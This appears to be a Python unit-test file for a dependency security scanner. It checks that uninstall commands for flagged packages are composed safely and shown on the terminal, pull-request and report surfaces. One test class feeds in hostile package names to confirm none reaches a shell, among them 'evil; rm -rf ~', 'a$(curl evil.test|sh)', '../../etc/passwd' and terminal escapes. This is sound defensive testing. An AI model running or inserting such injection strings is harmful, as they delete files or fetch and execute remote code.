#!/usr/bin/env python3
"""The commands saw hands an operator for a flagged dependency, on each surface that shows them."""
from __future__ import annotations

import io
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest import mock

from stayawake.bots.security.dependencies.remediation import (
    MALICIOUS, VULNERABLE, external_advisory_fix, malware_fix, removal_command, vulnerability_fix)
from stayawake.bots.security.models import Finding, ScanResult, Severity
from stayawake.bots.security.pr.render import ACTION_LIMIT, dependency_action_lines, _pr_body
from stayawake.bots.security.resolution import LocalTarget, REPOSITORY
from stayawake.bots.security.service import workers as scan_workers
from stayawake.bots.security.service.workers import WorkerScan
from stayawake.bots.security.service.report import _print_dependency_actions
from stayawake.bots.security.sinks.render import render_markdown
from stayawake.bots.security import service

BAD = "evil-pkg@1.2.3"
AFFECTED = "lodash@4.17.20"


def _dep(package: str, *, state: str = MALICIOUS, command: str | None = None) -> Finding:
    return Finding(signature_id="malicious-dependency", category="supply-chain-dep",
                   severity=Severity.CRITICAL, path="package.json", description="d",
                   fix_advice="a sentence for the report", dependency_state=state,
                   fix_command=command, package=package)


def _payload(findings=(), advisories=()) -> dict:
    result = ScanResult(target="acme/app", source="local", findings=list(findings),
                        advisories=list(advisories))
    return {"generated_at": "now", "results": [result.to_dict()],
            "summary": {"targets": 1, "infected": 0, "suspicious": 0, "residue": 0,
                        "findings": len(findings), "critical": 0, "high": 0}}


def _terminal(findings=(), advisories=()) -> str:
    result = ScanResult(target="acme/app", source="local", findings=list(findings),
                        advisories=list(advisories))
    buf = io.StringIO()
    with redirect_stderr(buf):
        _print_dependency_actions([result])
    return buf.getvalue()


class TestTheComposerStatesTheCommand(unittest.TestCase):
    """The function that composes the advice also states the command to run."""

    def test_a_known_malicious_package_is_uninstalled(self):
        fix = malware_fix("evil-pkg", "1.2.3", "npm")
        self.assertEqual("npm uninstall evil-pkg", fix.command)
        self.assertEqual(MALICIOUS, fix.state)

    def test_an_advisory_names_the_affected_version_and_no_install(self):
        fix = vulnerability_fix("npm", "lodash", "4.17.20", "4.17.21")
        self.assertEqual("lodash@4.17.20", fix.package)
        self.assertIsNone(fix.command)
        self.assertEqual(VULNERABLE, fix.state)

    def test_no_surface_ever_names_a_version_to_install(self):
        """saw's advisory cache can be stale, so it never asserts a version is safe."""
        fix = vulnerability_fix("npm", "lodash", "4.17.20", "4.17.21")
        for text in (fix.advice, fix.package, fix.command or ""):
            self.assertNotIn("4.17.21", text)

    def test_an_advisory_with_no_patched_version_is_not_called_malicious(self):
        """An unpatched CVE is not malware; saying so would be a false claim about the package."""
        fix = vulnerability_fix("npm", "lodash", "4.17.20", None)
        self.assertEqual("npm uninstall lodash", fix.command)
        self.assertEqual(VULNERABLE, fix.state)

    def test_an_external_auditors_advisory_has_no_command_to_give(self):
        fix = external_advisory_fix("left-pad", "1.0.0", "GHSA-1", "npm audit")
        self.assertIsNone(fix.command)
        self.assertEqual("left-pad@1.0.0", fix.package)
        self.assertEqual(VULNERABLE, fix.state)

    def test_an_unknown_ecosystem_gives_no_command(self):
        self.assertIsNone(malware_fix("x", "1.0", "no-such-eco").command)


class TestAHostileNameCannotReachTheShell(unittest.TestCase):
    """Check what a hostile package name or version produces."""

    HOSTILE = ["evil; rm -rf ~", "a$(curl evil.test|sh)", "a`id`", "a|sh", "a&&id", "a\nrm -rf ~",
               "../../etc/passwd", "a>out", "$(id)"]

    def test_no_hostile_name_builds_a_runnable_command(self):
        for name in self.HOSTILE:
            self.assertIsNone(removal_command("npm", name), name)

    def test_an_escape_in_a_package_name_never_reaches_the_terminal(self):
        fix = malware_fix("evil\x1b[2J\x07", "1.0\n#", "npm")
        out = _terminal(findings=[_dep(fix.package)])
        self.assertNotIn("\x1b[2J", out)
        self.assertNotIn("\x07", out)
        self.assertEqual(1, len([l for l in out.splitlines() if "evil" in l]))

    def test_a_hostile_name_yields_no_command_at_all(self):
        fix = malware_fix("evil; rm -rf ~", "1.0", "npm")
        self.assertIsNone(fix.command)

    def test_every_line_of_the_block_is_a_command_or_a_comment(self):
        out = _terminal(findings=[_dep("evil; rm -rf ~@1.0")],
                        advisories=[_dep("lodash@4.17.20", state=VULNERABLE)])
        payload = [ln.strip() for ln in out.splitlines()
                   if ln.startswith("  ") and ln.strip()]
        for line in payload:
            self.assertTrue(line.startswith("#") or line.startswith(("npm ", "pip ")), line)

    def test_a_flagged_package_is_listed_even_when_it_has_no_command(self):
        out = _terminal(findings=[_dep("evil; rm -rf ~@1.0")])
        self.assertIn("evil; rm -rf ~@1.0", out)
        self.assertNotIn("\nnpm uninstall evil", out)

    def test_a_terminal_escape_never_reaches_the_terminal(self):
        out = _terminal(findings=[_dep("x@1.0", command="npm uninstall \x1b[2Jx\x07")])
        self.assertNotIn("\x1b[2J", out)
        self.assertNotIn("\x07", out)

    def test_a_newline_cannot_forge_a_second_command(self):
        body = "\n".join(dependency_action_lines(
            findings=[_dep("x@1.0", command="npm uninstall a\nrm -rf ~")]))
        self.assertNotIn("\nrm -rf ~", body)

    def test_every_character_the_gate_admits_is_shell_safe(self):
        import shlex
        from stayawake.bots.security.dependencies import remediation as R
        for ch in map(chr, range(32, 127)):
            name = f"a{ch}b"
            if R._NAME_RE.match(name):
                self.assertEqual(name, shlex.quote(name), f"gate admits {ch!r}, which needs quoting")

    def test_a_scoped_npm_name_still_works(self):
        self.assertEqual("npm uninstall @scope/pkg", removal_command("npm", "@scope/pkg"))


class TestTheTwoCasesStayApart(unittest.TestCase):
    """Check which heading a command lands under."""

    def test_removals_and_upgrades_sit_under_their_own_heading(self):
        body = "\n".join(dependency_action_lines(findings=[_dep(BAD)],
                                                 advisories=[_dep(AFFECTED, state=VULNERABLE)]))
        self.assertIn("# known-malicious", body)
        self.assertIn("# affected by an advisory", body)
        self.assertLess(body.index(BAD), body.index(AFFECTED))

    def test_only_removals_names_only_that_heading(self):
        body = "\n".join(dependency_action_lines(findings=[_dep(BAD)]))
        self.assertIn("# known-malicious", body)
        self.assertNotIn("# affected by an advisory", body)


class TestItSaysEachCommandOnce(unittest.TestCase):
    def test_the_same_command_from_two_findings_is_said_once(self):
        body = "\n".join(dependency_action_lines(findings=[_dep(BAD), _dep(BAD)]))
        self.assertEqual(1, body.count(BAD))

    def test_nothing_to_run_renders_nothing(self):
        self.assertEqual([], dependency_action_lines(findings=[], advisories=[]))

    def test_a_finding_without_a_command_renders_nothing(self):
        bare = Finding(signature_id="x", category="c", severity=Severity.LOW, path="p",
                       description="d")
        self.assertEqual([], dependency_action_lines(findings=[bare]))

    def test_a_finding_that_names_no_action_renders_nothing(self):
        stray = Finding(signature_id="x", category="c", severity=Severity.LOW, path="p",
                        description="d", package="x@1.0")
        self.assertEqual([], dependency_action_lines(findings=[stray]))


class TestTheListIsBounded(unittest.TestCase):
    def test_past_the_limit_the_rest_is_counted(self):
        many = [_dep(f"p{i}@1.0") for i in range(ACTION_LIMIT + 10)]
        body = "\n".join(dependency_action_lines(findings=many))
        self.assertEqual(ACTION_LIMIT, body.count("#   p"))
        self.assertIn("and 10 more", body)


class TestEverySurfaceCarriesTheCommand(unittest.TestCase):
    def test_the_pull_request_body(self):
        body = _pr_body("acme/app", [], advisories=[_dep(AFFECTED, state=VULNERABLE)])
        self.assertIn(AFFECTED, body)
        self.assertIn("```sh", body)

    def test_a_body_with_nothing_to_run_has_no_block(self):
        self.assertNotIn("```sh", _pr_body("acme/app", []))

    def test_the_report_file_at_the_top(self):
        md = render_markdown(_payload(advisories=[_dep(AFFECTED, state=VULNERABLE)]))
        self.assertIn(AFFECTED, md)
        self.assertLess(md.index("## Compromised dependencies"), md.index("| Target |"))

    def test_a_report_with_nothing_to_run_has_no_block(self):
        self.assertNotIn("## Compromised dependencies", render_markdown(_payload()))

    def test_the_terminal_footer(self):
        self.assertIn(AFFECTED, _terminal(advisories=[_dep(AFFECTED, state=VULNERABLE)]))

    def test_a_run_with_nothing_to_run_prints_nothing(self):
        self.assertEqual("", _terminal())


class TestTheRunActuallyPrintsIt(unittest.TestCase):
    """The footer is wired into a real `saw scan`, not only into its renderer."""

    def _scan(self, result: ScanResult) -> str:
        with mock.patch.object(service.run, "resolve_local_targets",
                               return_value=[LocalTarget(Path("/x/r0"), None, REPOSITORY)]), \
             mock.patch.object(scan_workers, "scan_local", return_value=WorkerScan(result)), \
             redirect_stdout(io.StringIO()), redirect_stderr(io.StringIO()) as err:
            service.scan(None, no_stream=True, jobs=1)
        return err.getvalue()

    def test_a_scan_that_flags_a_dependency_prints_the_command(self):
        result = ScanResult(target="acme/app", source="local")
        result.advisories.append(_dep(AFFECTED, state=VULNERABLE))
        self.assertIn(AFFECTED, self._scan(result))

    def test_a_scan_that_flags_nothing_prints_no_block(self):
        self.assertNotIn("Compromised dependencies", self._scan(ScanResult(target="acme/app", source="local")))


if __name__ == "__main__":
    unittest.main()
